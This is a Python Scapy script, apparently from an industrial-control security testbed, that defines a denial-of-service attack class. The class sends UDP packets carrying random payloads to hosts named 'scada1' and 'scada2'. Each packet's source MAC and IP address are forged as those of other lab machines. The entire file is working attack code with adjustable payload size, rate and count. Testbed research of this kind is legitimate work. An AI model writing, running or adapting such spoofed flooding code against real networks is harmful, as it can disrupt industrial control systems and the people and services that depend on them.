from dos_header import machines
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP, UDP, ICMP, icmptypes
from scapy.data import ETHER_TYPES



class DOSAttack:
    def __init__(self):
        pass
    
    def start_attack(self, src_list, target_list, pkt_len, inter, cnt=1):
        # By default ether type is ipv4
        # TODO: Crosscheck if ether type should be 0x800 or IPv4
        # TODO: Raw len vs pkt len - sorted, same.
        # TODO: IP flags,id ?
        # Hardcode for the time being
        # if cnt < len(src_list) * len(target_list):
        
        # send all possible combination of (src, dst), cnt times
        # cnt = cnt * (len(src_list) * len(target_list))
        pkt_lst = []
        for target_name in target_list:
            for src_name in src_list:
                
                load = os.urandom(pkt_len)
                pkt = Ether(dst=machines[target_name]['mac'], 
                            src=machines[src_name]['mac'],
                            type=ETHER_TYPES['IPv4'])/\
                      IP(dst=machines[target_name]['ip'],
                         src=machines[src_name]['ip'],)/\
                      UDP(dport=machines[target_name]['port'],
                          sport=machines[src_name]['port'])/\
                      Raw(load=load)
                print(len(load))
                pkt.show2()
                pkt_lst.append(pkt)
              
        sendp(pkt_lst, iface="eth2", count=cnt, inter=inter)

if __name__ == "__main__":
    attack = DOSAttack()
    attack.start_attack(src_list=["mini3", "mini2"], target_list=["scada1", "scada2"], pkt_len=100, inter=1)
